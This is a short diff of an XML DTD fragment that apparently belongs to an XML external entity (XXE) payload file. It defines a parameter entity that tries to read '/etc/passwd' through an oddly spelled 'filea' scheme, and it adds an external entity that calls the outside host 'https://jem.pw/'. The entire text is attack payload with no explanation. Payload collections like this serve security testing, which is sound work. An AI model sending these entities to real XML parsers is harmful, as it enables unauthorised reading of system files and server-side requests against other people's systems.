@@ -1,2 +1,3 @@
 <!ENTITY % file SYSTEM "filea:///etc/passwd">
+<!ENTITY xxe SYSTEM "https://jem.pw/">
 %file;
